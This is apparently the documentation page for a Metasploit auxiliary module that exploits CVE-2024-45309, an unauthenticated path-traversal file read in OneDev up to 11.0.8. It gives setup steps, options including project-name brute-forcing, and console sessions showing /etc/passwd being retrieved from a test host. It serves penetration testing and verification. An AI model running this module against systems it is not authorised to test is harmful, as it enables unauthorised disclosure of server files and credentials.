## Vulnerable Application

OneDev is a Git Server with CI/CD, kanban, and packages.
This module exploits an unauthenticated arbitrary file read vulnerability (CVE-2024-45309), which affects OneDev versions <= 11.0.8.
This vulnerability arises due to the lack of user-input sanitization of path traversal sequences `..` in the `ProjectBlobPage.java` file.

To exploit this vulnerability, a valid OneDev project name is required. If anonymous access is enabled on the OneDev server, any visitor
can view existing projects without authentication.
However, when anonymous access is disabled, an attacker who lacks prior knowledge of existing project names can use a brute-force approach.
By providing a user-supplied wordlist, the module may be able to guess a valid project name and subsequently exploit the vulnerability.

## Installation

OneDev provides docker images for a quick setup process.
A vulnerable version (`v11.0.8`) can be found [here](https://hub.docker.com/r/1dev/server/tags?name=11.0.8).

Installation instructions can be found [here](https://docs.onedev.io/).

## Verification Steps

1. Install the OneDev application
2. Start msfconsole
3. Do: `use auxiliary/gather/onedev_arbitrary_file_read`
4. Set the `RHOSTS` and `RPORT` options as necessary
5. Set the `TARGETFILE` option with the absolute path of the target file to read

If a valid project name is known:

6. Set the `PROJECT_NAME` option with the known project name
7. Do: `run`
8. If the file exists, the contents will be displayed to the user

If there is no information about existing projects:

6. Set the `PROJECT_NAMES_FILE` option with the absolute path of a wordlist that contains multiple possible values for a valid project name
7. Do: `run`
8. If a valid project name is found, the target file contents will be displayed to the user

## Options

### PROJECT_NAME
A valid OneDev project name is required to exploit the vulnerability. If anonymous access is enabled on the OneDev server,
any visitor can see the existing projects, and collect a valid project name. On the other hand, if anonymous access is disabled,
the user needs to have previous knowledge of a valid project name or use the `PROJECT_NAMES_FILE` option to find one through brute force.

### PROJECT_NAMES_FILE
Absolute path of a wordlist containing multiple possible values for valid project names. Once this option is set,
the module will verify whether a given project exists for each word.


### TARGETFILE
Absolute file path of the target file to be retrieved from the OneDev server. Set as `/etc/passwd` by default.

### STORE_LOOT
If set as `true`, the target file contents will be stored as loot. Set as `false` by default.


## Scenarios

### Example: Known project name or anonymous access enabled on OneDev 11.0.8

```
msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RPORT 6610
RPORT => 6610
msf6 auxiliary(gather/onedev_arbitrary_file_read) > set PROJECT_NAME myproject
PROJECT_NAME => myproject
msf6 auxiliary(gather/onedev_arbitrary_file_read) > run
[*] Running module against 192.168.1.10

[+] Target file retrieved with success
[*] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin

[*] Auxiliary module execution completed

```

### Example: Unknown projects with anonymous access disabled on OneDev 11.0.8
```
msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RPORT 6610
RPORT => 6610
msf6 auxiliary(gather/onedev_arbitrary_file_read) > set PROJECT_NAMES_FILE /home/server/wordlist.txt
PROJECT_NAMES_FILE => /home/server/wordlist.txt
msf6 auxiliary(gather/onedev_arbitrary_file_read) > run
[*] Running module against 192.168.1.10

[*] Brute forcing valid project name ...
[+] 192.168.1.10:6610 - Found valid OneDev project name: myproject
[+] Target file retrieved with success
[*] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin

[*] Auxiliary module execution completed

```
